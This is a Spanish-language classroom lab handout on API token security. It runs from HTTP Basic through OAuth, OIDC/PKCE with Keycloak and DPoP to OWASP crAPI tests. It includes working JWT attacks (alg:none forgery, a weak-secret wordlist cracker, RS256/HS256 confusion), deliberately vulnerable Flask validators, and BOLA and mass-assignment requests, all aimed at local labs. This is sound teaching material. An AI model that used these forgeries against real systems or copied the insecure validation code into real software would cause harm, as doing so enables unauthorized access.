# Laboratorio paso a paso — Tokens y seguridad de APIs

**Anexo práctico de la clase "De Basic al DPoP".**
Pensado para tenerlo abierto el día de la charla: cada paso tiene comando, resultado esperado y "qué demuestra".

> ⚠️ **Seguridad primero.** Todos los ataques se ejecutan contra **laboratorios locales** (`127.0.0.1`) o endpoints públicos de práctica. **Nunca** contra sistemas de terceros sin autorización escrita. ID Uruguay se aborda **sólo en modo defensivo**, con tu propia cuenta y tu propio cliente.
>
> 🖥️ **Entorno.** Los comandos están en sintaxis bash. En Windows usá **Git Bash** o **WSL2**. Requiere: `docker`, `python` 3.10+, `curl`, `git`, `jq` (opcional). Verificalo en el Paso 0.

---

## Índice

- [Parte A — Calentamiento sin riesgo](#parte-a--calentamiento-sin-riesgo)
- [Parte B — Laboratorio JWT](#parte-b--laboratorio-jwt)
- [Parte C — OIDC, PKCE y refresh con Keycloak](#parte-c--oidc-pkce-y-refresh-con-keycloak)
- [Parte D — DPoP (sender-constrained)](#parte-d--dpop-sender-constrained)
- [Parte E — OWASP API Top 10 con crAPI](#parte-e--owasp-api-top-10-con-crapi)
- [Parte F — ID Uruguay (defensivo)](#parte-f--id-uruguay-defensivo)
- [Limpieza](#limpieza)
- [Resumen: paso → qué demuestra](#resumen-paso--qué-demuestra)

---

## Parte A — Calentamiento sin riesgo

### Paso 0 — Verificar herramientas

```bash
docker --version
python --version
curl --version | head -1
git --version
```

**Esperado:** versiones de cada herramienta. Si falta `jq`: Windows `winget install jqlang.jq`, Linux `sudo apt install jq`.

### Paso 1 — HTTP Basic: ver y decodificar credenciales

```bash
# Endpoint público de práctica (NO es un sistema de terceros)
curl -s -u usuario:clave https://httpbin.org/basic-auth/usuario/clave

# Mirar la cabecera que viaja
curl -s -D - -o /dev/null -u usuario:clave https://httpbin.org/basic-auth/usuario/clave | grep -i authorization
```

**Esperado:** JSON `{"authenticated": true, "user": "usuario"}` y una cabecera `Authorization: Basic dXN1YXJpbzpjbGF2ZQ==`.
**Qué demuestra:** las credenciales viajan en **cada** request.

```bash
# Base64 NO es cifrado
echo -n "dXN1YXJpbzpjbGF2ZQ==" | base64 -d; echo
```

**Esperado:** `usuario:clave`.
**Qué demuestra:** cualquiera que intercepte el tráfico lee la credencial.

### Paso 2 — API key

```bash
curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers | jq '.headers' 2>/dev/null || curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers
```

**Esperado:** aparece `"X-Api-Key": "clave-de-ejemplo"`.
**Qué demuestra:** la clave viaja en claro en una cabecera estática; si se filtra, no expira sola.

```bash
# Buscar secretos en TU propio repositorio (no ajenos)
docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect --source /repo -v
```

**Esperado:** reporte (posiblemente vacío en un repo limpio).
**Qué demuestra:** cómo se descubren claves hardcodeadas en repos y CI.

### Paso 3 — OAuth 1.0: entender la firma

```bash
cat > oauth1_sign.py <<'PY'
import hmac, hashlib, base64, urllib.parse
method, url = "GET", "https://api.ejemplo.com/recurso"
params = {"oauth_consumer_key": "key", "oauth_nonce": "abc123", "oauth_timestamp": "1700000000"}
base = "&".join([method,
                 urllib.parse.quote(url, safe=""),
                 urllib.parse.quote("&".join(f"{k}={params[k]}" for k in sorted(params)), safe="")])
sig = base64.b64encode(hmac.new(b"secreto", base.encode(), hashlib.sha1).digest()).decode()
print("base string:", base)
print("oauth_signature:", urllib.parse.quote(sig))
PY
python oauth1_sign.py
```

**Esperado:** se imprime la *base string* y una firma.
**Qué demuestra:** cada request se firma; **cambiar un parámetro invalida la firma**. Es la idea que DPoP recupera 13 años después.

> Probalo: cambiá `"abc123"` por `"abc124"` y volvé a correr. La firma cambia por completo.

### Paso 4 — Bearer: reutilización (sólo tu entorno)

```bash
curl -s -H "Authorization: Bearer token-de-ejemplo" https://httpbin.org/bearer
```

**Esperado:** `{"authenticated": true, "token": "token-de-ejemplo"}`.
**Qué demuestra:** el servidor no distingue quién porta el token; si lo tenés, entrás. (En clase: copiá **tu** token y usalo desde otra terminal contra **tu** API.)

### Paso 5 — Cookies (opcional, con Juice Shop)

```bash
docker run -d -p 3000:3000 --name juice bkimminich/juice-shop
```

Abrí http://localhost:3000, registrate, y en DevTools → Application → Cookies mirá `HttpOnly`, `Secure`, `SameSite`.
**Qué demuestra:** la diferencia entre sesión en cookie (navegador) y bearer en cabecera (API).

---

## Parte B — Laboratorio JWT

Este laboratorio es **deliberadamente vulnerable** y corre **sólo en local**.

### Paso 6 — Preparar entorno Python

```bash
mkdir -p jwt-lab && cd jwt-lab
python -m venv .venv
source .venv/Scripts/activate   # Windows Git Bash   (Linux/macOS: source .venv/bin/activate)
pip install flask pyjwt
```

### Paso 7 — Crear el servidor vulnerable

```bash
cat > lab_jwt.py <<'PY'
# lab_jwt.py — DELIBERADAMENTE VULNERABLE. Sólo 127.0.0.1. NO usar en producción.
from flask import Flask, request, jsonify
import jwt, datetime

app = Flask(__name__)
WEAK_SECRET = "secreto"          # débil a propósito (crackeable)

def bearer():
    return request.headers.get("Authorization", "").replace("Bearer ", "").strip()

def mint(sub="1", scope="read", aud="lab", exp_min=15):
    payload = {"sub": sub, "scope": scope, "aud": aud, "iss": "https://mi-lab",
               "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=exp_min)}
    return jwt.encode(payload, WEAK_SECRET, algorithm="HS256")

@app.route("/token")
def token():
    return jsonify(token=mint())

@app.route("/vuln/novalida")      # simula verificación ausente
def vuln_novalida():
    return jsonify(ok=True, claims=jwt.decode(bearer(), options={"verify_signature": False}))

@app.route("/vuln/debil")         # secreto débil + no exige exp ni aud
def vuln_debil():
    return jsonify(ok=True, claims=jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"],
                                              options={"verify_aud": False, "verify_exp": False}))

@app.route("/safe")               # verificación correcta
def safe():
    claims = jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"], audience="lab")
    return jsonify(ok=True, claims=claims)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
PY
python lab_jwt.py
```

Dejalo corriendo. En **otra** terminal:

```bash
curl -s http://127.0.0.1:5000/token | jq -r .token > token.txt
TOKEN=$(cat token.txt)
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:5000/safe | jq
```

### Paso 8 — Ataque `alg: none`

```bash
python - <<'PY'
import jwt, datetime
payload = {"sub": "999", "scope": "admin", "aud": "lab", "iss": "https://mi-lab",
           "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1)}
forge = jwt.encode(payload, None, algorithm="none")
open("forged_none.txt", "w").write(forge)
print("token forjado:", forge)
PY
FORGED=$(cat forged_none.txt)
echo "--- /vuln/novalida (acepta) ---"
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/vuln/novalida | jq
echo "--- /safe (debe rechazar) ---"
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/safe | jq
```

**Esperado:** `/vuln/novalida` devuelve `claims` con `"scope":"admin"`; `/safe` responde error 401.
**Qué demuestra:** si el validador no verifica la firma (o confía en `alg`), el token forjado pasa.

### Paso 9 — Crackear el secreto débil

```bash
cat > crack.py <<'PY'
import jwt, sys
tok = open("token.txt").read().strip()
words = ["123456","password","secreto","clave","admin","secret","jwt","token"]
for w in words:
    try:
        jwt.decode(tok, w, algorithms=["HS256"], options={"verify_aud": False})
        print("CLAVE ENCONTRADA:", w); sys.exit(0)
    except Exception:
        pass
print("sin suerte (probá una wordlist real)")
PY
python crack.py
```

**Esperado:** `CLAVE ENCONTRADA: secreto`.
**Qué demuestra:** con HS256, un secreto débil equivale a no tener firma. Con una wordlist real (`rockyou.txt`) y `jwt_tool tok -C -d rockyou.txt` el ataque es igual de directo.

### Paso 10 — Token sin `exp` y con `aud` equivocada

```bash
python - <<'PY'
import jwt
# sin exp, audience distinta
t = jwt.encode({"sub":"777","scope":"admin","aud":"otra-app","iss":"https://mi-lab"},
               "secreto", algorithm="HS256")
open("noexp.txt","w").write(t)
print(t)
PY
T=$(cat noexp.txt)
echo "--- /vuln/debil (acepta) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/vuln/debil | jq
echo "--- /safe (debe rechazar por aud) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/safe | jq
```

**Esperado:** `/vuln/debil` acepta; `/safe` rechaza por `audience`.
**Qué demuestra:** los claims `exp`/`aud` **hay que exigirlos**, no basta con que un token los traiga.

### Paso 11 — (Avanzado) Confusión RS256 → HS256

```bash
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
cat > lab_rs.py <<'PY'
# Servidor RS256 VULNERABLE A PROPÓSITO: acepta HS256 usando la clave pública como secreto.
from flask import Flask, request, jsonify
import jwt
app = Flask(__name__)
PUB = open("pub.pem").read()
@app.route("/r")
def r():
    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    return jsonify(ok=True, claims=jwt.decode(tok, PUB, algorithms=["HS256","RS256"]))
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5001)
PY
python lab_rs.py &
sleep 2
python - <<'PY'
from pathlib import Path
import jwt
pub = Path("pub.pem").read_text()
forged = jwt.encode({"sub":"1","scope":"admin"}, pub, algorithm="HS256")
open("rs_attack.txt","w").write(forged)
PY
curl -s -H "Authorization: Bearer $(cat rs_attack.txt)" http://127.0.0.1:5001/r | jq
```

**Esperado:** el servidor acepta un token firmado con la **clave pública** como secreto HMAC.
**Qué demuestra:** permitir `algorithms=["HS256","RS256"]` abre la confusión de algoritmos. **Regla: el algoritmo se fija en el validador, no en el token.** (RFC 8725.)

---

## Parte C — OIDC, PKCE y refresh con Keycloak

### Paso 12 — Levantar Keycloak

```bash
docker run -d --name keycloak -p 8080:8080 \
  -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:latest start-dev
```

Abrí http://localhost:8080 → Administration Console → `admin` / `admin`.

### Paso 13 — Crear realm, cliente y usuario

1. **Realm:** menú superior izquierdo → *Create realm* → nombre `lab` → *Create*.
2. **Cliente:** *Clients* → *Create client* → Client ID `lab-web` → *Next* → **Client authentication: OFF** (cliente público) → *Next* → **Valid redirect URIs:** `http://localhost:8989/callback` → *Save*.
3. En la pestaña **Advanced** del cliente: **Proof Key for Code Exchange (PKCE): S256** (requerido). Guardá.
4. Para ver rotación de refresh: en **Settings** activá **Revoke Refresh Token** (y *Refresh Token Max Reuse = 0*).
5. **Usuario:** *Users* → *Add user* → username `tester` → *Create* → pestaña **Credentials** → *Set password* (sin temporal).

**Qué configura:** un IdP OIDC real en tu máquina, con PKCE y rotación de refresh.

### Paso 14 — Ejecutar el flujo Authorization Code + PKCE

```bash
# Generar verifier y challenge (PKCE)
VERIFIER=$(python -c "import secrets; print(secrets.token_urlsafe(64))")
CHALLENGE=$(python -c "import hashlib,base64,sys; v=sys.argv[1].encode(); print(base64.urlsafe_b64encode(hashlib.sha256(v).digest()).rstrip(b'=').decode())" "$VERIFIER")
echo "verifier=$VERIFIER"; echo "challenge=$CHALLENGE"
```

Abrí en el navegador (reemplazá `CHALLENGE`):

```
http://localhost:8080/realms/lab/protocol/openid-connect/auth
  ?response_type=code
  &client_id=lab-web
  &redirect_uri=http://localhost:8989/callback
  &scope=openid profile email
  &state=abc123
  &nonce=n-0S6_WzA2Mj
  &code_challenge=CHALLENGE
  &code_challenge_method=S256
```

Iniciá sesión con `tester`. El navegador intentará ir a `http://localhost:8989/callback?code=XXXX&state=abc123` (fallará la carga, **es esperado**). **Copiá el `code`** de la barra de direcciones.

```bash
CODE="pegar-el-code"
VERIFIER="pegar-el-verifier"
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=authorization_code -d client_id=lab-web \
  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback \
  -d code_verifier="$VERIFIER" | tee tokens.json | jq
```

**Esperado:** JSON con `access_token`, `id_token`, `refresh_token`.
**Qué demuestra:** el código se cambia por tokens por **canal trasero**, protegido por PKCE.

### Paso 15 — Decodificar el ID token

```bash
IDT=$(jq -r .id_token tokens.json)
python - "$IDT" <<'PY'
import sys, json, base64
p = sys.argv[1].split('.')[1]
p += '=' * (-len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2, ensure_ascii=False))
PY
```

**Esperado:** `iss`, `aud`, `exp`, `sub`, `auth_time`, `amr`, `nonce`, `sid`.
**Qué demuestra:** el ID token dice **quién** y **cómo** se autenticó; va a la app, y **no** se usa para acceder a recursos.

### Paso 16 — Probar que PKCE es obligatorio

Repetí el intercambio **sin** `code_verifier` (con un code nuevo):

```bash
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=authorization_code -d client_id=lab-web \
  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback | jq
```

**Esperado:** error `invalid_grant` ("code_verifier missing"). Con Keycloak y PKCE obligatorio, el código robado **no sirve sin el verifier**.

### Paso 17 — Refresh token y rotación

```bash
RT=$(jq -r .refresh_token tokens.json)
# Canje 1
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" > t2.json
RT2=$(jq -r .refresh_token t2.json)
echo "RT viejo: ${RT:0:20}..."; echo "RT nuevo: ${RT2:0:20}..."
# Reusar el VIEJO (debe fallar si hay rotación/revoke)
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" | jq
```

**Esperado:** el refresh cambia y el viejo devuelve `invalid_grant`.
**Qué demuestra:** rotación + detección de reuso (lo que **RFC 9700** exige para clientes públicos).

### Paso 18 — Revocación / logout

```bash
# Revocar el refresh
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/revoke \
  -d client_id=lab-web -d token="$RT2" -d token_type_hint=refresh_token -o /dev/null -w "%{http_code}\n"
# Verificar que ya no sirve
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT2" | jq
```

**Esperado:** revocación `200`; luego `invalid_grant`.
**Qué demuestra:** existe un endpoint de revocación ([RFC 7009](https://www.rfc-editor.org/rfc/rfc7009)) y el logout debe invalidar artefactos.

---

## Parte D — DPoP (sender-constrained)

### Paso 19 — Construir una prueba DPoP (conceptual, local)

```bash
pip install cryptography
cat > dpop_proof.py <<'PY'
# DPoP: el CLIENTE firma una "prueba" con su clave privada. RFC 9449.
import json, base64, time, secrets
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def b64u_json(o): return b64u(json.dumps(o, separators=(',',':')).encode())

key = ec.generate_private_key(ec.SECP256R1())
header = {"typ": "dpop+jwt", "alg": "ES256",
          "jwk": {"kty":"EC","crv":"P-256",
                  "x": b64u(key.public_key().public_numbers().x.to_bytes(32,'big')),
                  "y": b64u(key.public_key().public_numbers().y.to_bytes(32,'big'))}}
claims = {"jti": secrets.token_urlsafe(16), "htm": "GET", "htu": "http://localhost:5000/safe",
          "iat": int(time.time())}
signing_input = (b64u_json(header) + "." + b64u_json(claims)).encode()
der = key.sign(signing_input, ec.ECDSA(hashes.SHA256()))
r, s = decode_dss_signature(der)
sig = b64u(r.to_bytes(32,'big') + s.to_bytes(32,'big'))
print(signing_input.decode() + "." + sig)
PY
python dpop_proof.py
```

**Qué demuestra:** la prueba ata el token al método (`htm`), a la URL (`htu`) y a un `jti` único. El servidor debe validar los tres y rechazar repeticiones. Un bearer robado **no sirve** sin esta clave. Comparar: es el mismo espíritu de OAuth 1.0, pero sin canonicalización y sobre JSON.

> Demostración de valor: repetí el token bearer del Paso 4 desde otro cliente (funciona). Con DPoP, el mismo token sin la prueba del cliente **no** funciona.

---

## Parte E — OWASP API Top 10 con crAPI

### Paso 20 — Levantar crAPI

```bash
git clone https://github.com/OWASP/crAPI.git
cd crAPI/deploy/docker
docker compose --env-file .env up -d
```

> Si algún comando cambió, seguí el README del repositorio: https://github.com/OWASP/crAPI
> crAPI queda en http://localhost:8888.

### Paso 21 — Registrar usuario y obtener token

```bash
# 1) Registro (adaptá el host/puerto al de tu despliegue)
curl -s -X POST http://localhost:8888/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"tester","email":"tester@lab.local","number":"5551234567","password":"Test1234!"}'
# 2) Login (devuelve un token)
curl -s -X POST http://localhost:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@lab.local","password":"Test1234!"}' | tee login.json | jq
TOKEN=$(jq -r .token login.json)
echo "$TOKEN"
```

### Paso 22 — API1: BOLA (el más importante)

1. En la interfaz de crAPI, creá un pedido/video y anotá su ID.
2. Con Burp/Postman (o `curl`), pedí **otro** ID del mismo tipo:

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/orders/<OTRO_ID> | jq
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/products | jq
```

**Esperado:** si devuelve datos de otro usuario, hay **BOLA**.
**Qué demuestra:** token válido + autorización a nivel de objeto ausente. **Api1 OWASP** — la vulnerabilidad número uno.

### Paso 23 — API3: Mass assignment / BOPLA

```bash
curl -s -X POST http://localhost:8888/identity/api/auth/v3/check-otp \
  -H "Content-Type: application/json" -d '{"email":"tester@lab.local","otp":"0000"}'
# Probá enviar campos de rol/saldo en endpoints de actualización (en el lab):
curl -s -X PUT http://localhost:8888/identity/api/v2/user/personal \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"x","role":"admin","balance":999999}'
```

**Qué demuestra:** si el backend acepta campos que no debería, el cliente controla propiedades sensibles.

### Paso 24 — API4/API9: consumo y versiones

```bash
# Rate limit / consumo: repetí una búsqueda costosa N veces
for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $TOKEN" "http://localhost:8888/workshop/api/shop/products"; done; echo
# Inventario: buscar versiones/swaggers expuestos
for p in /swagger /v1 /v2 /api /openapi.json /docs; do echo -n "$p -> "; curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888$p; done
```

**Qué demuestra:** ausencia de límites (Api4) e inventario desactualizado expuesto (Api9).

> Mapeo completo de los 10 riesgos y cómo probarlos: ver Módulo **M10** de `clase_tokens_seguridad.md`.

---

## Parte F — ID Uruguay (defensivo)

> **Línea estricta:** sólo tu cuenta y tu cliente de desarrollo. No se prueba el IdP ni clientes de terceros. Para evaluar el IdP, coordiná con **AGESIC** / **CERTuy**.

### Paso 25 — Recabar la evidencia documental

Abrí y leé:
- https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0
- https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro.pdf

**Buscá:** `token_type`, `Bearer`, `id_token`, `JWT`, `code_challenge`, `redirect_uri`.
**Qué demuestra:** el Estado uruguayo emite tokens bearer vía OIDC; el ID token es un JWT. Es evidencia **sin tocar nada**.

### Paso 26 — Observar tu propio flujo (con tu cuenta)

1. Iniciá sesión en **tu** aplicación integrada (o tu cliente de pruebas registrado).
2. DevTools → **Network** → filtrá `token` / `authorization`.
3. Localizá la respuesta del *token endpoint* y la petición con `Authorization: Bearer ...`.
4. **Enmascará el token** en pantalla (mostrá el inicio y tapá el resto).

**Qué demuestra:** el token es legible y extraíble del navegador; "quien lo tiene, lo usa". Sin ningún acceso indebido.

### Paso 27 — Decodificar tu ID token (offline)

Copiá **tu** ID token y pegalo en https://jwt.io (decodifica en el navegador, no viaja a ningún servidor).

**Esperado:** `iss`, `aud`, `sub`, `exp`, `auth_time`, `amr`/`acr` según configuración.
**Qué demuestra:** qué dice tu token y qué claims debería validar tu app.

### Paso 28 — Checklist de verificación de TU integración

Completá esta tabla mirando **tu** código/configuración (no el IdP):

| Control | Cómo verificarlo en tu cliente | Esperado |
|---|---|---|
| PKCE | `code_challenge` + `method=S256` en tu authorization request | Presente |
| `redirect_uri` exacta | URI registrada sin comodines; tu app la valida | Coincidencia exacta |
| `state` | Generado aleatorio y validado al volver | Presente y de un solo uso |
| `nonce` | Enviado en el request OIDC y validado en el ID token | Presente |
| Validación del ID token | Tu código valida `iss`, `aud`, `exp`, `nonce`, firma (JWKS) | Todo validado |
| No usar ID token para APIs | Buscá en tu código si el ID token viaja a la API | Nunca |
| Vida del access token | Decodificá `exp` de tu access token | Corta (minutos/horas) |
| Rotación de refresh | Repetí refresh: ¿cambia? ¿el viejo se invalida? | Rotación + detección |
| Revocación/logout | Cerrá sesión y reintentá con el token viejo | Rechazado |
| Transporte | Sólo HTTPS; token en header (no en query/URL) | Cumplido |
| Almacenamiento | Memoria o cookie `HttpOnly`; no `localStorage` | Sin acceso por JS |

### Paso 29 — Reproducción de la demostración para clase

Seguí el guion del **Módulo M11**: documentación → DevTools con token enmascarado → decode en jwt.io → cierre de sesión → frase de cierre.
**Qué demuestra:** todo el argumento de la charla con un caso uruguayo real, sin invadir nada.

### Paso 30 — Si encontrás algo: reporte responsable

Usá la plantilla del archivo `clase_tokens_seguridad.md` (Sección 5) y canalizá por:
- **CERTuy (AGESIC):** https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/
- Contacto del equipo dueño del sistema.

Incluí alcance probado, pasos mínimos y evidencia enmascarada. **No** accedas a datos de terceros para "probar impacto".

---

## Limpieza

```bash
docker stop keycloak juice 2>/dev/null; docker rm keycloak juice 2>/dev/null
# crAPI
cd crAPI/deploy/docker && docker compose down -v
# procesos locales
#   Ctrl+C en las terminales de lab_jwt.py y lab_rs.py
```

---

## Resumen: paso → qué demuestra

| Pasos | Tema | Qué se comprueba | Riesgo |
|---|---|---|---|
| 0–4 | Basic, API key, OAuth1, bearer | Credenciales por request, clave estática, firma, replay | Nulo (endpoints de práctica) |
| 5 | Cookies | HttpOnly/Secure/SameSite | Nulo (local) |
| 6–11 | JWT | `alg:none`, secreto débil, `exp`/`aud`, confusión HS/RS | Local |
| 12–18 | OIDC/PKCE/refresh | PKCE obligatorio, claims, rotación, revocación | Local |
| 19 | DPoP | Prueba de posesión por request | Local |
| 20–24 | OWASP Top 10 | BOLA, BOPLA, consumo, inventario | Local (crAPI) |
| 25–30 | ID Uruguay | Evidencia + verificación defensiva de tu integración | Nulo / tu entorno |

**Regla final:** *si dudás si tenés permiso para un paso, no lo hagas. En seguridad, la autorización también es un control.*

